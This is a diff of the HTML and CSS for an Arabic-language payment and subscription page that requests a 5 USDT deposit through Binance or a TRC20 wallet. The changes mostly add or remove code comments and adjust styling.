@@ -5,11 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KXTRM - الدفع والاشتراك</title>
     
+    <!-- جلب خط Cairo بالوزن الثقيل 900 لمحاكاة الخط الكوفي العريض للجميع -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
     <link href="https://googleapis.com/css2?family=Cairo:wght@900&display=swap" rel="stylesheet">
 
     <style>
+        /* تطبيق الخط الكوفي العريض بشكل إجباري على كل عناصر الصفحة */
         * {
             font-family: 'Cairo', sans-serif !important;
             font-weight: 900 !important;
@@ -53,8 +55,8 @@
         
         /* تنسيق شريط الأرقام المتحركة فائق الوضوح */
         .countries-bar {
-            background-color: #06040a; /* خلفية داكنة جداً لزيادة التباين والوضوح */
-            border: 2px solid #00ffaa; /* إطار مضيء ملفت */
+            background-color: #06040a; 
+            border: 2px solid #00ffaa; 
             border-radius: 10px;
             padding: 10px;
             margin-bottom: 25px;
@@ -72,12 +74,12 @@
             display: inline-flex;
             align-items: center;
             margin-left: 35px;
-            font-size: 18px; /* حجم خط كبير وواضح جداً */
-            color: #00ffaa; /* لون أخضر فسفوري مضيء وواضح */
-            text-shadow: 0 0 8px rgba(0, 255, 170, 0.4); /* تأثير إضاءة خفيف لخلفية النص */
+            font-size: 18px; 
+            color: #00ffaa; 
+            text-shadow: 0 0 8px rgba(0, 255, 170, 0.4); 
         }
         .country-item span {
-            color: #ffffff; /* كلمة الحالة باللون الأبيض الناصع */
+            color: #ffffff; 
             margin-left: 6px;
         }
         @keyframes marquee {
@@ -150,6 +152,7 @@
             transition: 0.2s;
         }
         .binance-btn-final:hover { transform: scale(1.02); }
+        
         .manual-deposit-box {
             margin-top: 25px; 
             padding: 18px 15px; 
@@ -173,6 +176,7 @@
             overflow: hidden; 
             text-overflow: ellipsis; 
             box-sizing: border-box;
+            margin-bottom: 5px;
         }
         .copy-btn-pulse {
             padding: 12px; 
@@ -212,9 +216,8 @@
         <div class="amount-tag">الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
+            <!-- الخطوة الأولى -->
             <div id="step1">
-                
-                <!-- شريط الحالات والأرقام المتحركة المحدث ليكون فائق الوضوح -->
                 <div class="countries-bar">
                     <div class="countries-track">
                         <div class="country-item"><span>الحالة:</span> 33627ع.ل</div>
@@ -224,7 +227,6 @@
                         <div class="country-item"><span>الحالة:</span> 78563ش.م</div>
                         <div class="country-item"><span>الحالة:</span> 21459ط.ق</div>
                         <div class="country-item"><span>الحالة:</span> 65478ن.ر</div>
-                        <!-- تكرار دائرى لضمان حركة مستمرة بدون انقطاع -->
                         <div class="country-item"><span>الحالة:</span> 33627ع.ل</div>
                         <div class="country-item"><span>الحالة:</span> 14892م.س</div>
                         <div class="country-item"><span>الحالة:</span> 99541ر.ك</div>
@@ -249,10 +251,12 @@
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
             </div>
 
+            <!-- الخطوة الثانية -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
                 </a>
 
                 <div class="manual-deposit-box">
+                    <p style="font-size: 14px; margin-bottom: 12px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
